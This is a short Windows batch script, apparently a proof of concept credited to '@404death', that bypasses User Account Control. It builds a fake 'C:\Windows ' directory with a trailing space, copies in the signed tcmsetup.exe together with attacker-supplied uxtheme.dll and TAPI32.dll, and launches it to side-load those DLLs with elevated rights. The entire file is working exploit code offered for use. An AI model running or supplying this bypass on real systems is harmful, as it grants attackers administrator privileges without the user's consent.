@echo off
echo.
echo #### UAC Bypass In The Wild By @404death ####
mkdir "\\?\C:\Windows " 
mkdir "\\?\C:\Windows \System32"
echo  [+] file copying ...
copy "C:\Windows\System32\tcmsetup.exe" "C:\Windows \System32\"
echo  [+] file copying ...
copy "uxtheme.dll" "C:\Windows \System32\"
echo  [+] file copying ...
copy "TAPI32.dll" "C:\Windows \System32\"
"C:\Windows \System32\tcmsetup.exe"
echo  [-] UAC Bypassed ?
